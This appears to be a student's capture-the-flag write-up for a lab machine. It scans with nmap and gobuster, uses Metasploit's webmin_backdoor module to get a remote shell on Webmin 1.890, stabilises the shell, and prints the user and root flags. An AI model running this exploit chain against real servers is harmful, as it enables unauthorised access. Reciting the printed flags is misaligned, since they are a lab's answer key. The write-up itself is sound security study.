---
Title: SWS101 CTF 
Categories: [SWS101, CTFJournal4]
Tags: [SWS101]
---

### Topic: source

### Objective 
The initial objective of Task 1 Embark is to list as well as establish administrative privileges in the connected virtual machine. It entails the ability to first, determine the root course of a malfunction and then to exploit it so one can regain control of the system. 
 
Environment and Tools 
The VM used in this task is located in the AttackerKB room, and the OVA file for offline use can be downloaded from the resource of darkstar7471. 
 
Steps and Methodology 
 1. Initial Enumeration with Nmap 
 This is the first step and involves using Nmap, a tool that is used in the scanning of the target machine with an aim of identifying the open ports. 

 Nmap Command:
 nmap -sV <10.10.5.43>

 Output
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)

 Accessing Port 10000 
 Since, we do not have the credentials for SSH (port 22) then we proceed to search for port 10000 which is running Webmin. 
 
 Accessing Webmin: 
 
 URL: https://<10.10.5.43>:10000 

 First connection will open a warning that you are connecting to a non secure site. Continue by going to advanced and then to the site. 
 3. The next is Directory Brute Force with Gobuster 
 Searching for other directories or files, we use Gobuster on port 10000. 

 Gobuster Command:
gobuster dir -u https://<ip-address>:10000 -w /usr/share/wordlists/dirb/common.txt -k

output
/unauthenticated

 
 Vulnerability Scanning with Metasploit 
 
 To detect the weakness, exploitation is carried out using Metasploit against Webmin targets. 

 Metasploit Commands:
msfconsole
use exploit/linux/http/webmin_backdoor
set RHOSTS <ip-address>
set LHOST <your-ip-address>
set SSL true
run

 
 The vulnerability for Webmin namely exploit/linux/http/webmin_backdoor does not involve authorization and enables us to get a shell. 
 
 5. Gaining a Stable Shell 
 
 The first shell that may be launched from Metasploit can be pretty unstable. Using python, we stabilize it, Thank you 
 Command to stabilize shell:
 python3 -c 'import pty; pty.spawn("/bin/bash")'


 6. Finding Flags 
 
 Having the root access we can search for the user and root flags and read them. 
 
 User Flag: 
 Path: /home/dark/user. txt 
 
 Content: THM{SUPPLY_CHAIN_COMPROMISE} 
 
 Root Flag: 
 
 Path: /root/root. txt 
 
 Content: THM{UPDATE_YOUR_INSTALL} 
 
 
